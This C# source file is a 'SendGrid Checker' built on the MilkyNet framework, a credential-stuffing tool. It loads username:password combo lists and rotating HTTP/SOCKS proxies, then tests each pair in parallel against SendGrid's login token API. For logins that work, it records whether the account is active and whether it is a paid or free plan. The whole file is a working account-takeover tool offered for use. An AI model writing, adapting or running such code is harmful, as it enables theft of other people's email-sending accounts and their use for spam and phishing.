using Milky.Objects;
using MilkyNet;
using Newtonsoft.Json;
using System;
using System.Threading;
using System.Threading.Tasks;
using static Milky.Output.OutputSettings;

namespace SendGrid_Checker
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            var Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("SendGrid Checker", "1.1.1", "Laiteux", "https://pastebin.com/raw/QW82zeqi");
            Milky.ConsoleSettings.SetTitleStyle(true, true);
			
			var threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);

            Milky.RunSettings.proxyProtocol = Milky.UserUtils.AskChoice("Proxy Protocol", new string[] { "HTTP", "SOCKS4", "SOCKS5" });

            Milky.FileUtils.LoadCombos("Username:Password");
            Milky.FileUtils.LoadProxies(Milky.RunSettings.proxyProtocol);

            Milky.RunManager.StartRun();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                var splittedCombo = combo.Split(':');

                var resultType = ResultType.Unknown;
                var captures = new CaptureDictionary();

                if (splittedCombo.Length == 2)
                {
                    var login = splittedCombo[0];
                    var password = splittedCombo[1];

                    while (resultType == ResultType.Unknown)
                    {
                        try
                        {
                            var request = Milky.RequestUtils.SetProxy(new MilkyRequest());

                            request.AddHeader("Content-Type", "application/json");

                            var publicTokensResponse = Milky.RequestUtils.Execute(request,
                                HttpMethod.POST, "https://api.sendgrid.com/v3/public/tokens",
                                "{\"username\":\"" + Uri.EscapeDataString(login) + "\",\"password\":\"" + Uri.EscapeDataString(password) + "\"}");
                            var publicTokensSource = publicTokensResponse.ToString();
                            var publicTokensJSON = JsonConvert.DeserializeObject<dynamic>(publicTokensSource);

                            if (publicTokensJSON.token != null)
                            {
                                request.Authorization = $"token {publicTokensJSON.token}";

                                var userStatusResponse = Milky.RequestUtils.Execute(request, HttpMethod.GET, "https://api.sendgrid.com/v3/user/status");
                                var userStatusSource = userStatusResponse.ToString();
                                var userStatusJSON = JsonConvert.DeserializeObject<dynamic>(userStatusSource);

                                if (userStatusJSON.status == "active")
                                {
                                    var userPackageResponse = Milky.RequestUtils.Execute(request, HttpMethod.GET, "https://api.sendgrid.com/v3/user/package");
                                    var userPackageSource = userPackageResponse.ToString();
                                    var userPackageJSON = JsonConvert.DeserializeObject<dynamic>(userPackageSource);

                                    captures.Add("Package", (string)userPackageJSON.name);

                                    resultType = userPackageJSON.plan_type == "free" ? ResultType.Free : ResultType.Hit;
                                }
                                else
                                {
                                    resultType = ResultType.Invalid;
                                }
                            }
                            else if (publicTokensSource.Contains("access forbidden") || publicTokensSource.Contains("required") || publicTokensSource.Contains("bad request"))
                            {
                                resultType = ResultType.Invalid;
                            }

                            request.Dispose();
                        }
                        catch { }
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType, captures);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
